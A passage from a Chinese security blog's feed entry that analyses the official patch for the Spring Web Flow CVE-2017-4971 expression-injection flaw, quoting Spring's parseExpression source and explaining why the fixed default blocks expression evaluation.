class="line">viewFactory.setFieldMarkerPrefix(fieldMarkerPrefix);</span><br><span class="line">&#125;</span><br><span class="line">viewFactory.setValidator(validator);</span><br><span class="line">viewFactory.setValidationHintResolver(validationHintResolver);</span><br><span class="line"><span class="keyword">return</span> viewFactory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>查看官方在Spring Web Flow 2.4.5 版本中的补丁是怎么写的：<a href="https://github.com/spring-projects/spring-webflow/commit/57f2ccb66946943fbf3b3f2165eac1c8eb6b1523#diff-d9efeba3700c0135e224911fadb39795" target="_blank" rel="noopener">https://github.com/spring-projects/spring-webflow/commit/57f2ccb66946943fbf3b3f2165eac1c8eb6b1523#diff-d9efeba3700c0135e224911fadb39795</a></p><p><img src="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/3.png" alt=""></p><p>直接将ExpressionParser设置为BeanWrapperExpressionParser对象的实例，默认是执行不了表达式的。</p><p>查看BeanWrapperExpressionParser的源码：<a href="https://github.com/spring-projects/spring-webflow/blob/v2.4.5.RELEASE/spring-binding/src/main/java/org/springframework/binding/expression/beanwrapper/BeanWrapperExpressionParser.java" target="_blank" rel="noopener">https://github.com/spring-projects/spring-webflow/blob/v2.4.5.RELEASE/spring-binding/src/main/java/org/springframework/binding/expression/beanwrapper/BeanWrapperExpressionParser.java</a></p><p>其中的parseExpression()函数是直接继承的spring-webflow/spring-binding/src/main/java/org/springframework/binding/expression/support/AbstractExpressionParser类的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// expression parser</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Expression <span class="title">parseExpression</span><span class="params">(String expressionString, ParserContext context)</span> <span class="keyword">throws</span> ParserException </span>&#123;</span><br><span class="line">Assert.notNull(expressionString, <span class="string">"The expression string to parse is required"</span>);</span><br><span class="line"><span class="keyword">if</span> (context == <span class="keyword">null</span>) &#123;</span><br><span class="line">context = NullParserContext.INSTANCE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (context.isTemplate()) &#123;</span><br><span class="line"><span class="keyword">return</span> parseTemplate(expressionString, context);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (expressionString.startsWith(getExpressionPrefix()) &amp;&amp; expressionString.endsWith(getExpressionSuffix())) &#123;</span><br><span class="line"><span class="keyword">if</span> (!allowDelimitedEvalExpressions) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ParserException(</span><br><span class="line">expressionString,</span><br><span class="line"><span class="string">"The expression '"</span></span><br><span class="line">+ expressionString</span><br><span class="line">+ <span class="string">"' being parsed is expected be a standard OGNL expression. Do not attempt to enclose such expression strings in $&#123;&#125; delimiters--this is redundant. If you need to parse a template that mixes literal text with evaluatable blocks, set the 'template' parser context attribute to true."</span>,</span><br><span class="line"><span class="keyword">null</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">int</span> lastIndex = expressionString.length() - getExpressionSuffix().length();</span><br><span class="line">String ognlExpression = expressionString.substring(getExpressionPrefix().length(), lastIndex);</span><br><span class="line"><span class="keyword">return</span> doParseExpression(ognlExpression, context);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> doParseExpression(expressionString, context);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，这里if判断条件的allowDelimitedEvalExpressions，这个默认值是false，因此默认是不能进入里面的代码逻辑、也就执行不了表达式了。</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://paper.seebug.org/322/" target="_blank" rel="noopener">Spring Web Flow 远程代码执行漏洞分析(CVE-2017-4971)</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/categories/Java/Spring/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/tags/Spring/"/>
    
      <category term="SpEL注入" scheme="https://www.mi1k7ea.com/tags/SpEL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
